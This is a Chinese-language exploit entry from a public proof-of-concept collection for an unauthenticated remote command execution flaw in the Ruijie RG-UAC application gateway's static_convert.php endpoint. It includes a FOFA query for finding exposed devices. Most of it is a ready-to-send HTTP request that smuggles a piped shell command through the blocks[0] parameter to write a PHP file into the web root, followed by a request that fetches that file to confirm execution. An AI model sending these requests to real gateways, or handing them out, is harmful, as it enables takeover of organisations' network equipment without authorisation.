---

source: "wy876 漏洞文库"
---

# 锐捷RG-UAC应用网关static_convert.php前台RCE漏洞

### 一、漏洞描述
<font style="color:rgba(0, 0, 0, 0.9);">锐捷RG-UAC应用管理网关static_convert.php 接口处存在命令执行漏洞，未经身份认证的攻击者可执行任意命令控制服务器权限。</font>

### 二、影响版本
锐捷RG-UAC应用网关

### 三、资产测绘
fofa：app="Ruijie-RG-UAC"

特征：


### 四、漏洞复现
```java
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20echo%20md5("666");unlink(__FILE__);?>%27%20>/var/www/html/ceshi.php HTTP/1.1
Host:
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


```java
GET /ceshi.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ofaghdl3fyqnfsf3>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
